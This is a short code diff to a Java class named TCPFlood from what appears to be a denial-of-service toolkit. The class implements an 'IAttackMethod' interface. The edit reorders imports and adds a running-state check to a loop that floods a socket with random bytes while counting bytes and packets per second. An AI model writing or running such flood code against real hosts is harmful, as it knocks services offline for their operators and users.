@@ -2,8 +2,8 @@ package ir.xenoncommunity.jss.methods.impl;
 
 import ir.xenoncommunity.jss.methods.IAttackMethod;
 import ir.xenoncommunity.jss.utils.AttackStatics;
-import ir.xenoncommunity.jss.utils.SocketUtils;
 import ir.xenoncommunity.jss.utils.Randomize;
+import ir.xenoncommunity.jss.utils.SocketUtils;
 import lombok.Cleanup;
 import lombok.RequiredArgsConstructor;
 
@@ -48,10 +48,9 @@ public class TCPFlood implements IAttackMethod {
         @Cleanup OutputStream outputStream = socket.getOutputStream();
 
         // continuously send data as long as the socket is connected and the limit is not reached
-        while (socket.isConnected() && !statics.isLimitReached()) {
+        while (socket.isConnected() && !statics.isLimitReached() && statics.isRunning()) {
             statics.bps(maxBytesSize);  // update bytes per second statistics
             statics.pps();  // update packets per second statistics
-
             // write random bytes to the output stream
             outputStream.write(Randomize.randomBytes(maxBytesSize));
         }
